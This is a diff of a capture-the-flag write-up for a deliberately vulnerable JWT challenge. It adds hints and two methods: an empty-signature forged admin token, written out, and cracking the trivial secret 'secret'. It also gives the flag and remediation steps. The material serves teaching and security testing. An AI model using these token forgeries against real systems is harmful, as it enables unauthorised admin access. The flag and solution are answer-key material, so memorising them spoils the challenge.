@@ -1,29 +1,43 @@
 [Vulnerability Report]
-Challenge: Insecure JWT Storage & Validation
+Challenge: Insecure JWT Storage & Application Logic
 Severity: Critical
 Status: Confirmed
 
+[Question]
+Access to the "SysAdmin Protocol" is restricted to administrators only. The authentication system seems to have multiple critical flaws. Can you find a way to become an admin?
+
+[Hints]
+1. What happens if you simply remove the signature from the token?
+2. The secret key might be extremely weak (e.g., the most common password in the world).
+3. The server might not be checking if a signature is present at all.
+
 [Description]
-The application uses JSON Web Tokens (JWT) for session management stored in `localStorage`. The server-side verification logic (`verifyJWT` in `api.php`) is vulnerable to the "None" algorithm attack, allowing attackers to forge tokens with arbitrary roles by stripping the signature.
+The application uses JSON Web Tokens (JWT) for session management. The server-side verification logic (`verifyJWT` in `api.php`) has been critically weakened:
+1. It accepts tokens with **empty signatures**, regardless of the algorithm specified in the header.
+2. It accepts the "None" algorithm.
+3. It uses a trivial secret key (`"secret"`), making it vulnerable to brute-force or dictionary attacks.
 
 [Exploitation Steps]
-1. Retrieve the `nexus_token` from Local Storage.
-   Example: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3Mzg...`
-2. Decode the Base64 payload. Identify `"role": "guest"`.
-3. Create a forged token:
-   a. Header: `{"typ":"JWT","alg":"none"}` -> Base64: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=`
-   b. Payload: `{"role":"admin"}` -> Base64: `eyJyb2xlIjoiYWRtaW4ifQ==`
-   c. Signature: (Empty)
-4. Construct the token: `header.payload.` (Note the trailing period).
-   Result: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJyb2xlIjoiYWRtaW4ifQ==.`
-5. Inject the forged token into `localStorage.setItem('nexus_token', '...')`.
-6. Navigate to "Administration" -> "Execute SysAdmin Protocol".
+Method 1: The "Empty Signature" Bypass (Easiest)
+1. Retrieve your `nexus_token` from Local Storage.
+2. Create a forged payload with `"role": "admin"`.
+   - Base64 Encode `{"role":"admin"}` -> `eyJyb2xlIjoiYWRtaW4ifQ==`
+3. Construct the token using the original header, new payload, and an **empty signature**.
+   - Format: `header.payload.` (Note the trailing dot is required).
+   - Example: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ==.`
+4. Save to Local Storage: `localStorage.setItem('nexus_token', 'YOUR_TOKEN_HERE')`
+5. Configured to "Administration" -> "Execute SysAdmin Protocol" to get the flag.
+
+Method 2: Weak Secret Attack
+1. Use a tool like `jwt_tool` or `hashcat` to crack the signature.
+2. The secret is simply `"secret"`.
+3. Sign your own admin token using this secret.
 
 [Finding]
-The server accepts the unsigned admin token and returns the system configuration:
+The server accepts the forged admin token and grants access to the restricted system configuration:
 KEY: flag{jw7_st0r4g3_3xp0s3d}
 
 [Remediation]
-1. Configure the JWT library to explicitly reject the "none" algorithm.
-2. Enforce a strong, specific algorithm (e.g., HS256) on verification.
-3. Use a cryptographically strong secret key (not `nexus_secret_2024`).
+1. Enforce a strong, specific algorithm (e.g., HS256) and reject "none".
+2. **Mandatory Signature Check**: Ensure the signature is present and valid for all requests.
+3. Use a complex, high-entropy secret key (min 32 chars) stored in environment variables, never hardcoded.
